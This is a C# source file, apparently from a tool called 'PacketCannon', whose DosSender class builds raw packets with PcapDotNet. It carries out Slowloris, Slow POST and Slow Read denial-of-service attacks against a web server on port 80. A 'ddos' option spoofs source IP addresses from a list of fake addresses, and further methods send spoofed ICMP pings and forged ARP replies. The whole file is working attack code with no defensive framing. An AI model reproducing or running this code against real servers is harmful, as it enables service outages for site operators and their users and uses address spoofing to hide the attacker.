using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Http;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using static PacketCannon.SenderStatus;
using HttpVersion = PcapDotNet.Packets.Http.HttpVersion;

namespace PacketCannon
{
    public class DosSender
    {
        private static readonly Random _rand = new Random();

        public DosSender(IPacketDevice packetDevice, string sourceIp, string destIp, MacAddress destMac, MacAddress sourceMac, string host, string slowLorisKeepAliveData, string slowLorisHeaderNotComplete, int slowPostHeaderContentLength, string slowPostHeader, string slowReadUrl, int startPort, int portStep, bool ddos = false)
        {
            if (ddos)
            {
                var randomNumber = _rand.Next() % DosController.FakeIpV4Addresses.Count;
                Console.WriteLine(randomNumber);
                SourceIpV4 = DosController.FakeIpV4Addresses[randomNumber];
            }
            else
            {
                SourceIpV4 = new IpV4Address(sourceIp);
            }
            DestinationIpV4 = new IpV4Address(destIp);
            SourceMac = sourceMac;

            DestinationMac = destMac;

            SlowLorisHeaderNotComplete = slowLorisHeaderNotComplete;

            SlowPostHeader = slowPostHeader + $"\r\nContent-Length: {slowPostHeaderContentLength}\r\n\r\n";

            SlowReadUrl = slowReadUrl;
            SlowPostContentLength = slowPostHeaderContentLength;
            SlowLorisKeepAliveData = slowLorisKeepAliveData;
            Host = host;
            SourcePort = (ushort)(startPort + NextSourcePort);
            NextSourcePort += (ushort)portStep;
        }

        public MacAddress SourceMac { get; set; }
        public MacAddress DestinationMac { get; set; }
        public IpV4Address SourceIpV4 { get; set; }
        public IpV4Address DestinationIpV4 { get; set; }
        public string Host { get; set; }
        public SenderStat Status = SenderStat.SendSyn;
        public static ushort NextSourcePort;
        public readonly int SlowPostContentLength;
        public readonly string SlowLorisKeepAliveData;
        public readonly string SlowLorisHeaderNotComplete;
        public readonly string SlowPostHeader;
        public string SlowReadUrl { get; set; }
        public int Waited = 0;

        public void SendSyn(PacketCommunicator communicator)
        {
            // Ethernet Layer
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                ControlBits = TcpControlBits.Synchronize,
                Window = WindowSize,
            };

            communicator.SendPacket(PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer));
            ExpectedAckNumber = SeqNumber + 1;
        }

        public void SendAck(PacketCommunicator communicator)
        {
            // Ethernet Layer
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = TcpControlBits.Acknowledgment,
                Window = WindowSize,
            };

            communicator.SendPacket(PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer));
            _identificatioNumber++;
        }

        public void SendGetNotComplete(PacketCommunicator communicator)
        {
            // Ethernet Layer
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            var ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            var tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = (TcpControlBits)24,
                Window = WindowSize,
            };

            var httpPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowLorisHeaderNotComplete))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void SendSlowLorisKeepAlive(PacketCommunicator communicator)
        {
            // Ethernet Layer
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = (TcpControlBits)24,
                Window = 222,
            };

            PayloadLayer httPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowLorisKeepAliveData + "\r\n"))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httPayloadLayer);

            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
        }

        public void SendSlowPostHeader(PacketCommunicator communicator)
        {
            // Ethernet Layer
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            var ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            var tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = (TcpControlBits)24,
                Window = WindowSize,
            };

            var httpPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowPostHeader))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void SendSlowPostKeepAlive(PacketCommunicator communicator)
        {
            // Ethernet Layer
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = (TcpControlBits)24,
                Window = 222,
            };

            var a = (char)('a' + new Random().Next(0, 26));

            PayloadLayer httPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes($"{a}"))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httPayloadLayer);

            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
        }

        public void SendSlowReadCompleteGet(PacketCommunicator communicator)
        {
            // Ethernet Layer
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            var ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            var tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = TcpControlBits.Acknowledgment,
                Window = WindowSize,
            };

            HttpRequestLayer httpRequestLayer = new HttpRequestLayer
            {
                Uri = SlowReadUrl,
                Method = new HttpRequestMethod(HttpRequestKnownMethod.Get),
                Version = HttpVersion.Version11,
                Header = new HttpHeader(HttpField.CreateField("Host", Host))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpRequestLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void PingAddress(PacketCommunicator communicator, IpV4Address ipAddress)
        {
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = ipAddress,
                Ttl = 128,
                CurrentDestination = DestinationIpV4
            };

            var icmpLayer = new IcmpEchoLayer();

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, icmpLayer);
            communicator.SendPacket(packet);
        }

        public void SendArpResponse(PacketCommunicator communicator, IpV4Address ipAddress)
        {
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            var a = Regex.Matches(SourceMac.ToString().Replace(":", ""), @"\S{2}").Cast<Match>().Select(m => m.Value).ToArray();
            var macParsed = new byte[a.Length];
            for (int i = 0; i < a.Length; i++)
            {
                macParsed[i] = (byte)int.Parse(a[i], System.Globalization.NumberStyles.HexNumber);
            }
            var b = Regex.Matches(DestinationMac.ToString().Replace(":", ""), @"\S{2}").Cast<Match>().Select(m => m.Value).ToArray();
            var targetMacParsed = new byte[b.Length];
            for (int i = 0; i < b.Length; i++)
            {
                targetMacParsed[i] = (byte)int.Parse(b[i], System.Globalization.NumberStyles.HexNumber);
            }

            ArpLayer arpLayer = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Reply,
                SenderHardwareAddress = macParsed.AsReadOnly(),
                SenderProtocolAddress = ipAddress.ToString().Split('.').Select(n => Convert.ToByte(n)).ToArray().AsReadOnly(),
                TargetHardwareAddress = macParsed.AsReadOnly(),
                TargetProtocolAddress = DestinationIpV4.ToString().Split('.').Select(n => Convert.ToByte(n)).ToArray().AsReadOnly(),
            };
            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, arpLayer);
            communicator.SendPacket(packet);
        }

        public readonly ushort SourcePort;
        public static ushort DestinationPort = 80;
        public uint SeqNumber = (uint)new Random().Next();
        public uint ExpectedAckNumber;
        public ushort WindowSize = 15;
        public uint AckNumber;
        private ushort _identificatioNumber = (ushort)new Random().Next(100, 1000);
    }
}